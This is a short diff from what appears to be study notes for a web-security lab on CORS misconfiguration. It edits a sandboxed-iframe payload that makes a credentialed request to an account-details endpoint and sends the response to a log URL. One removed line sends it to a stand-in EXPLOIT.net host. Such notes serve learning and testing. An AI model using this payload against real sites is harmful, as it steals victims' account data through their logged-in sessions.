@@ -3522,11 +3522,11 @@ Origin: http://subdomain.TARGET.NET
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','https://TARGET.net/account_api/?EPOCHtime=1679134272000',true);
+    req.open('get','https://0a8800060461f6f782759cd40020002d.web-security-academy.net/accountDetails',true);
     req.withCredentials = true;
     req.send();
     function reqListener() {
-        location='https://EXPLOIT.net/log?key='+encodeURIComponent(this.responseText);
+        location='/log?key='+encodeURIComponent(this.responseText);
     };
 </script>"></iframe>
 ```  
